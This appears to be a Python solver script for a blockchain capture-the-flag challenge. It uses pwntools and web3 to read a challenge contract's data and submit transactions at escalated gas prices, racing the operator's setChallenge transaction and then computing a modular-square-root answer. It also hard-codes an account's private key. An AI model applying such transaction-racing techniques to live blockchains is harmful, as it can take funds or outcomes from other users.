from eth_abi import encode as encode_abi
from web3 import Web3
import requests
import json
from pwn import *
import gmpy2
import IPython
from datetime import datetime
import threading
import time
import sys

MODULUS = 2**44497-1

def sloth_root(x, p):
    exponent = (p + 1) // 4
    x = gmpy2.powmod(x, exponent, p)
    return int(x)

def solve_challenge(x):
    y = sloth_root(x, MODULUS)
    return y

node_url = "https://floordrop-rpc.hpmv.dev/"

w3 = Web3(Web3.HTTPProvider("https://floordrop-rpc.hpmv.dev/")) 
assert w3.is_connected()

keccak = w3.keccak

hacker1 = '0xff9c07ED008F17392C523CA23b11d957970BeE8c'
sk_hacker1 = '0xfdf5995bd05427c872b3984a18f0b004fcaee7b2a9c7f6192507d8312c65943b'

p = remote('mc.ax', 32123)
p.sendlineafter(b'option:', b'2')


def func_sig(func: str) -> bytes:
    return keccak(func.encode())[:4]

hacker_nonce = w3.eth.get_transaction_count(hacker1)
hacker_gasPrice = w3.eth.gas_price * 2
cid = w3.eth.chain_id
sig_solveChallenge = func_sig('solveChallenge(bytes,uint256)')

def get_txn(src, dst, data, value=0):
    global hacker_nonce, hacker_gasPrice, cid
    tx = {
        "chainId": cid,
        "from": src,
        "to": dst,
        "gasPrice": hacker_gasPrice,
        "gas": 0x321850*2,
        "value": 0,
        "nonce": hacker_nonce,
        "data": data
    }
    hacker_nonce += 1
    hacker_gasPrice += w3.to_wei(6.000000016,'gwei')
    return tx

def send_tx(signed_txn, send: bool = True):
    if send:
        txn_hash = w3.eth.send_raw_transaction(signed_txn.rawTransaction).hex()
        # print(txn_hash)
        # txn_receipt = w3.eth.wait_for_transaction_receipt(txn_hash)
        # assert txn_receipt['status'] == 1
    else:
        pass

def send_hacker_tx(data, hacker_, sk_hacker_):
    signed_txn = w3.eth.account.sign_transaction(get_txn(hacker_, target, data), sk_hacker_)
    send_tx(signed_txn)


p.recvuntil(b'Challenge contract deployed at ')
addr = p.recvline().rstrip().decode()
p.success('https://floordrop.hpmv.dev/address/'+addr)

target = addr

p.recvuntil(b'Challenge nonce: ')
nonce = p.recvline().rstrip().decode()

p.recvuntil(b'The challenge will be set momentarily...')

time.sleep(9.6)

data = func_sig('solveChallenge(bytes,uint256)')
data += encode_abi(['bytes','uint256'],[b'\xbe', 1])
send_hacker_tx(data,hacker1,sk_hacker1)

p.recvuntil(b'Sent setChallenge transaction ')
setChallenge_txhash = p.recvuntil(b';')[:-1].decode()

tx = w3.eth.get_transaction(setChallenge_txhash)
challenge = int(tx['input'][-16:].hex(),0x10)


sol = solve_challenge(challenge)
ans = sol.to_bytes((sol.bit_length() + 7) // 8, 'big').hex()

data = sig_solveChallenge
data += encode_abi(['bytes','uint256'],[bytes.fromhex(ans), int(nonce,0x10)])

send_hacker_tx(data,hacker1,sk_hacker1)
gmt_time = datetime.utcnow()
print(gmt_time)
print(p.recvall().decode())
